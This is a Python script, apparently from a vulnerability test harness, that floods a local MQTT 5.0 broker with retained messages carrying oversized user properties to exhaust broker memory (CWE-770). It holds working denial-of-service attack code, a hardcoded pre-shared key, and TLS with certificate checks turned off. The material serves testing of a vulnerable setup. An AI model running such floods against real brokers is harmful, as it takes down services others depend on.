"""
MQTT 5.0 User Property Injection Attack Client (VULNERABLE - No Validation)

Sends packets with massive user properties to broker WITHOUT any validation.
This simulates what happens when an application doesn't enforce property limits.

Each attack packet carries 50 user properties × 1KB values = ~50KB per packet.
All attack messages use retain=True so they accumulate in broker memory.
After 20 iterations of 30 attack packets each, ~30MB of property data is stored.

CWE-770: Allocation of Resources Without Limits or Throttling
"""

import paho.mqtt.client as mqtt
from paho.mqtt.properties import Properties
from paho.mqtt.packettypes import PacketTypes
import ssl
import sys
import time
import threading

BROKER = "localhost"
PORT = 8883
PSK_ID = "client1"
PSK_KEY = "0123456789abcdef"

# Attack parameters
NORMAL_PACKETS = 5           # Normal baseline packets per iteration
ATTACK_PACKETS = 30          # Attack packets per iteration
NUM_PROPERTIES = 50          # User properties per attack packet
PROP_VALUE_SIZE = 1024       # 1KB per property value
# Memory per attack packet: 50 × 1KB = ~50KB
# Memory per iteration:     30 × 50KB = ~1.5MB
# After 20 iterations:      ~30MB accumulated retained messages


def create_psk_context():
    """Create TLS context with PSK authentication."""
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_psk_client_callback(
        lambda hint: (PSK_ID.encode(), bytes.fromhex(PSK_KEY))
    )
    return ctx


def main():
    iteration = int(sys.argv[1]) if len(sys.argv) > 1 else 1

    connected = threading.Event()
    sent_count = 0

    def on_connect(client, userdata, flags, reason_code, properties=None):
        if reason_code == 0:
            connected.set()
        else:
            print(f"  Connection failed: {reason_code}", file=sys.stderr)

    # Create MQTT 5.0 client
    client = mqtt.Client(
        callback_api_version=mqtt.CallbackAPIVersion.VERSION2,
        protocol=mqtt.MQTTv5,
        client_id=f"attacker-{iteration}"
    )
    client.on_connect = on_connect
    client.tls_set_context(create_psk_context())

    try:
        client.connect(BROKER, PORT)
    except Exception as e:
        print(f"  Connect error: {e}", file=sys.stderr)
        print("0")
        return

    client.loop_start()

    if not connected.wait(timeout=5):
        print("  Connection timeout", file=sys.stderr)
        print("0")
        client.loop_stop()
        return

    # Phase 1: Normal packets (small properties - baseline)
    for i in range(NORMAL_PACKETS):
        props = Properties(PacketTypes.PUBLISH)
        props.UserProperty = [("sensor", "temperature"), ("unit", "celsius")]
        result = client.publish(
            f"normal/iter{iteration}/{i}",
            f"temp={20 + i}",
            retain=True,
            properties=props,
            qos=0
        )
        if result.rc == mqtt.MQTT_ERR_SUCCESS:
            sent_count += 1
        time.sleep(0.01)

    print(f"  [VULN] Normal packets sent: {NORMAL_PACKETS}", file=sys.stderr)

    # Phase 2: Attack packets (massive user properties - NO VALIDATION!)
    for i in range(ATTACK_PACKETS):
        props = Properties(PacketTypes.PUBLISH)
        user_props = []
        for j in range(NUM_PROPERTIES):
            user_props.append((f"atk-{j:04d}", "X" * PROP_VALUE_SIZE))
        props.UserProperty = user_props

        result = client.publish(
            f"attack/iter{iteration}/{i}",
            "malicious-data",
            retain=True,
            properties=props,
            qos=0
        )
        if result.rc == mqtt.MQTT_ERR_SUCCESS:
            sent_count += 1
        time.sleep(0.01)

    print(f"  [VULN] Attack packets sent: {ATTACK_PACKETS} (NO validation)", file=sys.stderr)

    # Wait for messages to be delivered
    time.sleep(1)

    client.loop_stop()
    try:
        client.disconnect()
    except Exception:
        pass

    # Output only the count (parsed by run.sh)
    print(sent_count)


if __name__ == "__main__":
    main()
